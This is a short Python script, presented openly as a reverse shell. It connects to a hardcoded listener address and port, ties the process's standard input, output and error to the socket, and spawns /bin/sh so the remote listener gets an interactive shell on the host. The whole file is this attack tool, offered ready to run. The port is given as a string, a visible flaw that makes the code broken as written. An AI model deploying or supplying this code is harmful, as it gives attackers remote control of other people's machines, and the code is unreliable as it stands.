#!/usr/bin/python3
#Simple python reverse shell. Set up a netcat listener, change the IP:Port and run
import sys
import socket
import os
import pty

target_ip = "192.168.1.127" #CHANGE THIS
target_port = "1337" #CHANGE THIS

#Create and connect to socket
s = socket.socket()
try:
  s.connect((target_ip, target_port))
except Exception as e:
  print(f"Error connecting to {target_ip}:{target_port} - {e} check firewall and verifiy connectivity")
  sys.exit(1)
#Redirect standard file descriptors to the specified socket
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
#Spawns shell at listener
pty.spawn("/bin/sh")
